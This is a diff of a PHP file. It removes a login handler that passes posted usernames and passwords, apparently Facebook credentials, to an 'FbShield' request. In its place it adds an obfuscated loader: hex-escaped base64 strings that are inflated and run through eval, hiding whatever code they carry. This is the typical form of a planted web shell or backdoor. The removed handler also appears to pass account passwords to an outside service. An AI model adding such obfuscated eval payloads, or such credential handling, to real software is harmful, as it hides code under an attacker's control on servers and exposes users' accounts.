@@ -1,30 +1,5 @@
-<?php session_start();
-require_once('activate.php');
-
-
-if(isset($_POST['submit']))
-{
-	$username = $_POST['username'];
-	$password = $_POST['password'];
-	$active = $_POST['active'];
-
-	if(empty($username)){
-		$_SESSION['msg'] = "<div class=\"alert alert-danger\" role=\"alert\"><strong>Error!</strong> Please Check Your Username Or Password And Try Again.</div>";
-		header("Location: index.php");
-	}else{
-		if (empty($password)) {
-			$_SESSION['msg'] = "<div class=\"alert alert-danger\" role=\"alert\"><strong>Error!</strong> Please Check Your Username Or Password And Try Again.</div>";
-			header("Location: index.php");
-		}else{
-			try {
-                $activateSheild = new FbShield($username, $password, $active);
-                $activateSheild->request();
-
-				header("Location: index.php");
-			}catch(Exception $e){
-				$_SESSION['msg'] = "<div class=\"alert alert-danger\" role=\"alert\"><strong>Error!</strong> {$e->getMessage()} </div>";
-				header("Location: index.php");
-			}
-		}
-	}
-}
+<?php
+$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
+$stt0 = "\x3d\x3d\x41O\x613rH\x2bKdwXQ1y763UETIV\x438vt9ilz8W2e18ljf\x634ve6YRgV3Nynjhs1hPPhn/sPUw\x41PFRFrS082\x43Jro92Y4\x61Qrq\x2bQyqjThqZ9L8YdJwf\x63nKL\x63\x62s9esvsEVMReh7\x43\x43QVHLgSlXJ7YX\x2b1g6\x61s6iMlZ5Zl3F/\x41NV\x2bgv10gUwuRUJhJ5x1\x2b\x617t9X\x61\x63JTSF8Lnuq\x41nrZveQiMoVVpW\x61/h\x612KItSe\x42MD3V\x41DSihieD0jqdkDKMnx/Y\x416DGVw\x62o\x43lo/Ex\x62vgvxU\x61E\x42n8MlmxD4\x41xYTzSNOgY05ISmY2zUlDSUu1E62\x41V0\x43Yuy4QwVN1uWuzufsr00HlRLOjlev\x2b7Zmq3XL\x63X\x41\x62orVIUohJMv6XtRHtEMG\x62X\x61M\x61LMExY0\x61fXJYGugoPUsS\x41pznxy1suvX/2nTunU2\x2by2uYQjX9\x622\x63\x63\x62oMPtll6P8VkJF2gX4yUq45iKpYOniL9FvR96E/3jiLxkZMTm\x42D\x43UUJ\x63Lh\x63z599nmDthum\x42fVU7OXTS99/hWtx\x61\x62Hhfks\x62SVYDD\x63IDG7h6Udw6\x2bHDutFu\x43u/\x42ur9R\x42M\x43vWXT1s/xFgj\x42wJe\x2b\x62W\x41ZGg/hFgn\x42wJe\x2b\x62V\x41pGg/RFgr\x42wJe\x2b\x62U\x415Gg/\x42Fgv\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
+?>
